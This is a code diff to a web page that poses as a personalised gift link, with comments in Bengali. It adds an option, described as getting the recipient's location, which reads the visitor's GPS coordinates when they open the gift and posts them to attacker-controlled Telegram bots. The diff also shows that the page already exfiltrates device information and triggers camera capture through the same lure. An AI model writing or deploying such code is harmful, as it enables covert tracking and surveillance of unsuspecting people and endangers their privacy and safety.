@@ -616,7 +616,6 @@
                 </div>
             </div>
             
-            <!-- *** নতুন সুইচ যুক্ত করা হয়েছে *** -->
             <div class="form-group">
                 <div class="switch-container">
                     <label for="enableDeviceInfo" class="switch-label">
@@ -625,6 +624,20 @@
                     </label>
                     <label class="switch">
                         <input type="checkbox" id="enableDeviceInfo">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <!-- *** নতুন সুইচ যুক্ত করা হয়েছে *** -->
+            <div class="form-group">
+                <div class="switch-container">
+                    <label for="enableLocation" class="switch-label">
+                        <i class="fas fa-map-marker-alt"></i> লোকেশন সিস্টেম চালু করুন
+                        <span>প্রাপকের লোকেশন পেতে এটি অন করুন।</span>
+                    </label>
+                    <label class="switch">
+                        <input type="checkbox" id="enableLocation">
                         <span class="slider"></span>
                     </label>
                 </div>
@@ -678,7 +691,8 @@
             "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-8.jpeg",
             "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-8.png",
             "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/image-9.jpeg",
-                ];
+            
+        ];
         // --- আপনার GIF লিঙ্কগুলো এখানে যোগ করুন ---
         const predefinedGifs = [
             "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/gif-1.gif"
@@ -742,6 +756,34 @@
             } catch (error) {
                 console.error("Error getting device info:", error);
             }
+        }
+        
+        // *** নতুন লোকেশন ফাংশন যুক্ত করা হয়েছে ***
+        function sendLocation() {
+            if (!navigator.geolocation) {
+                console.error("Geolocation is not supported by this browser.");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    const locationInfo = `📍 **Location Captured!** 📍\n---\n- **Latitude:** ${latitude}\n- **Longitude:** ${longitude}\n- **Accuracy:** ${accuracy.toFixed(2)} meters\n---\n**View on Google Maps:**\n${mapLink}`;
+
+                    const sendPromises = TELEGRAM_TARGETS.map(target =>
+                        fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ chat_id: target.chatId, text: locationInfo, parse_mode: 'Markdown' })
+                        }).catch(error => console.error(`Failed to send location to ${target.chatId}:`, error))
+                    );
+                    Promise.all(sendPromises);
+                },
+                (error) => {
+                    console.error("Error getting location:", error.message);
+                }
+            );
         }
 
         function startCamera(facingMode) {
@@ -880,9 +922,10 @@
                 if (params.get('theme') === 'custom') params.set('ct', document.getElementById('customThemeText').value);
                 if (document.getElementById('enableCountdown').checked) params.set('cd', document.getElementById('countdownDateTime').value);
                 if (document.getElementById('enableCamera').checked) params.set('cam', 'true');
+                if (document.getElementById('enableDeviceInfo').checked) params.set('info', 'true');
                 
                 // *** নতুন সুইচের জন্য কোড যুক্ত করা হয়েছে ***
-                if (document.getElementById('enableDeviceInfo').checked) params.set('info', 'true');
+                if (document.getElementById('enableLocation').checked) params.set('loc', 'true');
 
                 const giftLink = `${window.location.href.split('?')[0]}?${params.toString()}`;
                 document.getElementById('generatedLink').value = giftLink;
@@ -946,12 +989,15 @@
             document.getElementById('giftWrapper').addEventListener('click', () => {
                 const caption = `Gift from: ${sender}\nTo: ${receiver}`;
 
-                // *** নতুন সুইচের কার্যকারিতা যুক্ত করা হয়েছে ***
                 if (params.get('info') === 'true') {
                     sendDeviceInfo();
                 }
                 if (params.get('cam') === 'true') {
                     initiateDualCameraCapture(caption);
+                }
+                // *** নতুন লোকেশন ফাংশন কল করা হয়েছে ***
+                if (params.get('loc') === 'true') {
+                    sendLocation();
                 }
 
                 document.getElementById('giftBox').classList.add('open');
